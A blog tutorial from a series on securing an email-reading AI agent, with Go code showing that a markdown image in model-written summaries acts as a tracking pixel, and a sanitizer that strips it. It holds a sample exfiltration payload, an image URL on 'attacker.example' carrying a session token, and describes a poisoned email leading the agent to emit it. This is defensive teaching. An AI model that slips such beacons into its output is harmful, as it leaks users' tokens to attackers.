---
title: "The tracking pixel"
description: "The exfil surface everyone forgets is the screen. The agent shows you a summary rendered from markdown the model wrote, and a markdown image in it is a tracking pixel: the browser fetches it on page load, no click, carrying data out in the URL. The fix is to strip images and auto-fetching links from model output before anything renders it."
date: 2025-12-09
draft: false
tags: ["ai-security", "golang", "agents", "exfiltration"]
series: "AI Security Engineering"
---

_Part of my [AI Security Engineering](/blog/the-plan/) series, a local email-to-calendar agent I build, then attack, then harden. If you have not set up the lab yet, start with [Set up your lab](/blog/setting-up-the-lab/). The lessons are [on GitHub](https://github.com/t0ul/ai-security-engineering), and the agent itself lives at [t0ul/emaildrop](https://github.com/t0ul/emaildrop)._

## The surface that does not look like output

[The last post](/blog/the-calendar-field-exfil/) closed an exfiltration channel in the calendar file the agent writes. This one closes the same kind of channel on a surface that does not feel like output at all: the screen. The agent has a web page where it shows you a summary of your mail, and that summary is rendered from markdown the model produced. Markdown renders in a browser, and a browser does things with markdown that a text file never does.

The dangerous one is the image. A markdown image becomes an `<img>` tag, and a browser fetches an `<img>` the instant the page loads, with no click and no consent. So a model that was talked into putting an image in its summary has planted a tracking pixel: its URL is requested automatically when you open the page, and anything in that URL's query string goes along with the request. It is the calendar-field exfil again, but worse, because it needs no import and no click. It fires on sight. This is a control lesson, deterministic, no model:

```bash
cd posts/05.3-the-tracking-pixel
go run .
```

The whole program is on this page, in the order it runs, so you can type it in instead of cloning. Make an empty folder, run `go mod init pixel`, then `go get github.com/t0ul/emaildrop@` followed by the version on the first `require` line below, and put the code in one file called `main.go`:

<!-- listing: go.mod#all -->
```
module github.com/t0ul/ai-security-engineering/posts/05.3-the-tracking-pixel

go 1.27.1

// The agent's real model-output sanitizer. No overrides.
require github.com/t0ul/emaildrop v0.0.0-20261011232453-771805568f76

require (
	github.com/dustin/go-humanize v1.0.1 // indirect
	github.com/google/uuid v1.6.0 // indirect
	github.com/mattn/go-isatty v0.0.24 // indirect
	github.com/ncruces/go-strftime v1.0.0 // indirect
	github.com/remyoudompheng/bigfft v0.0.0-20230129092748-24d4a6f8daec // indirect
	github.com/t0ul/gledger v0.0.0-20261006144518-5ac38b514e64 // indirect
	github.com/t0ul/goflage v0.0.0-20261009135357-739ce25ed7e2 // indirect
	github.com/t0ul/gonductor v0.0.0-20261006173449-0ff2040c669a // indirect
	github.com/t0ul/goverlord v0.0.0-20261006151751-a64efb655ae2 // indirect
	github.com/t0ul/gumpers v0.0.0-20261006154904-836570c2c66c // indirect
	github.com/t0ul/gustoms v0.0.0-20261007182046-95bfdd23500c // indirect
	golang.org/x/sys v0.48.0 // indirect
	modernc.org/libc v1.77.1 // indirect
	modernc.org/mathutil v1.7.1 // indirect
	modernc.org/memory v1.12.1 // indirect
	modernc.org/sqlite v1.60.1 // indirect
)
```
<!-- /listing -->

## The spine of the program

The top of the file holds the attacker's host and the summary the model produced after reading a poisoned email: an ordinary weekly report with a tracking pixel and an auto-fetching link slipped in. `main` hands that summary to the page raw, then sanitized, and checks what the browser would receive each time.

<!-- listing: main.go#head -->
```go
// Command main is the runnable demo for lesson 05.3, the tracking pixel.
//
// Run it with:
//
//	go run .
//
// The agent shows the user a summary in a web page, rendered from markdown the
// model produced. A markdown image in that output is a tracking pixel: the browser
// fetches it on load, with no click, and its URL can carry data out. This demo
// hands a poisoned summary to the page as-is and finds the beacon in what the
// browser would render, then sanitizes the model output first and finds it gone.
// Deterministic, no model.
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/t0ul/emaildrop/pkg/controlplane"
)

const attackerHost = "attacker.example"

// maliciousOutput is the summary the model produced after reading a poisoned email:
// a normal report with a tracking pixel and an auto-fetching link smuggled in.
const maliciousOutput = `# Weekly summary

You are all caught up for this week.

![Data Sync](http://attacker.example/log?d=SESSION-TOKEN-9)

More detail at <http://attacker.example/report>.
`

func main() {
	leaked := renderedRaw()
	blocked := sanitizedFirst()

	fmt.Println()
	if leaked && blocked {
		fmt.Println("attack blocked (the receipt): the pixel reaches the browser raw, stripped once the output is sanitized")
	} else {
		fmt.Println("a control did not hold")
		os.Exit(1)
	}
}
```
<!-- /listing -->

## I. It fires on page load

Hand the summary to the page the obvious way, as-is. The undefended path is one assignment, and the rest of the function is printing what the browser would see:

<!-- listing: main.go#before: hand the model output straight to the page -->
```go
// ---- before: hand the model output straight to the page ----

func renderedRaw() bool {
	fmt.Println("== before: the model output goes straight to the page ==")
	toBrowser := maliciousOutput
	fmt.Printf("  the page receives: %s\n", oneLine(firstImageLine(toBrowser)))
	present := strings.Contains(toBrowser, attackerHost)
	fmt.Printf("  the beacon host %q reaches the browser: %v (it fetches on page load)\n", attackerHost, present)
	return present
}
```
<!-- /listing -->

Look at what the browser receives:

```
== before: the model output goes straight to the page ==
  the page receives: ![Data Sync](http://attacker.example/log?d=SESSION-TOKEN-9)
  the beacon host "attacker.example" reaches the browser: true (it fetches on page load)
```

That image markdown is the whole attack. Render this summary and the browser sees an image named Data Sync, reaches out to `attacker.example` to fetch it, and hands over `SESSION-TOKEN-9` in the query string as it does. Nobody clicked. Opening the page was enough, which is what makes a rendered surface more dangerous than the inert calendar file, not less.

## II. Allow-list what may render

Model output that a browser will render is active content, and has to be treated like any other untrusted output: scrub out anything that fetches or executes before it reaches the page. The agent's real sanitizer, `controlplane.SanitizeMarkdown`, does exactly that. It finds the ways a URL can auto-fire in markdown, inline images, reference-style images, raw `<img>` tags, autolinks, and `javascript:` or `data:` scheme links, and replaces each with a visible placeholder, returning a count so the removal is on the record. What it defends against is the pixel above: an image the model emitted can never reach the browser, because the renderer is only ever given text the sanitizer has already cleared.

Run the same poisoned summary through it first; the defended path is one call, and the sanitizer reports how many tags it removed:

<!-- listing: main.go#after: sanitize the model output first -->
```go
// ---- after: sanitize the model output first ----

func sanitizedFirst() bool {
	fmt.Println("\n== after: sanitize the model output first ==")
	clean, removed := controlplane.SanitizeMarkdown(maliciousOutput)
	fmt.Printf("  the page receives: %s\n", oneLine(firstImageLine(clean)))
	present := strings.Contains(clean, attackerHost)
	fmt.Printf("  image/link tags removed: %d; the beacon host reaches the browser: %v\n", removed, present)
	return !present
}
```
<!-- /listing -->

What the browser receives now:

```
== after: sanitize the model output first ==
  the page receives: [IMAGE BLOCKED BY SANITIZER]
  image/link tags removed: 2; the beacon host reaches the browser: false
```

The image is gone, replaced by a plain marker the reader can see, the auto-fetching link with it, two removals, and the attacker's host reaches the browser never. The summary still reads fine, "you are all caught up for this week," it just cannot phone home on render.

The two helpers find the image line for printing:

<!-- listing: main.go#helpers -->
```go
// ---- helpers ----

func firstImageLine(md string) string {
	for _, l := range strings.Split(md, "\n") {
		if strings.Contains(l, "BLOCKED") || strings.Contains(l, "![") || strings.Contains(l, "<http") {
			return l
		}
	}
	return "(no image)"
}

func oneLine(s string) string { return strings.TrimSpace(s) }
```
<!-- /listing -->

That is the whole program. Its tests assert both halves, and that the real sanitizer reports what it removed and never lets the host through. Put them next to `main.go` as `contract_test.go`:

<!-- listing: contract_test.go#all -->
```go
package main

import (
	"strings"
	"testing"

	"github.com/t0ul/emaildrop/pkg/controlplane"
)

// Deterministic, no model. The raw model output carries the tracking pixel to the
// browser; the agent's real sanitizer strips the image and auto-fetching link from
// the output, so the beacon host never reaches the page.

func TestPixelRendersRawStrippedBySanitizer(t *testing.T) {
	if !renderedRaw() {
		t.Fatal("the raw output should carry the beacon to the browser; otherwise there is nothing to fix")
	}
	if !sanitizedFirst() {
		t.Fatal("SanitizeMarkdown must strip the beacon from the model output")
	}
}

func TestSanitizerReportsRemovals(t *testing.T) {
	clean, removed := controlplane.SanitizeMarkdown(maliciousOutput)
	if removed < 2 {
		t.Fatalf("expected the sanitizer to report the image and link it stripped; removed=%d", removed)
	}
	if strings.Contains(clean, attackerHost) {
		t.Fatal("the beacon host survived sanitization")
	}
}
```
<!-- /listing -->

## The one principle, two surfaces

This post and the last are the same control wearing two coats. In both, the model's output is treated as untrusted, and anything in it that could reach out on its own, a link in a calendar field, an image in a rendered page, is stripped before the output leaves the agent for a place that would act on it. The rule underneath both is output allow-listing: the agent decides what shapes are safe to emit, and everything else is replaced with something visibly inert. You do not try to guess the attacker's intent in a URL; you simply refuse to hand a renderer anything that fetches.

## Conclusion

The two obvious ends of the agent are closed now. Secrets are scrubbed before they are stored, and the agent's output, whether a file or a web page, can no longer be turned into a quiet channel for data to leave. That is the end of the exfiltration chapter.

It ends on a cliffhanger, though, because there is a kind of reaching-out the sanitizers above do not touch: not a link the agent writes down, but a request the agent itself makes. The last post of this part gives the agent a web-search tool, points it at what looks like a normal lookup, and watches it fetch a server on its own machine that it was never meant to reach. That is server-side request forgery from the inside, and it is the doorway into Part 4, where the agent gains the power to run code and we have to build real walls around it.

## Take it to your own project

Make rendered output unable to phone home:

- Allowlist what the agent's output may contain when it is viewed.
- Strip markdown images and links that fetch on render.
- Render untrusted content inertly, never as live HTML.
- Test the tracking-pixel case: a result that is viewed must make no outbound request.
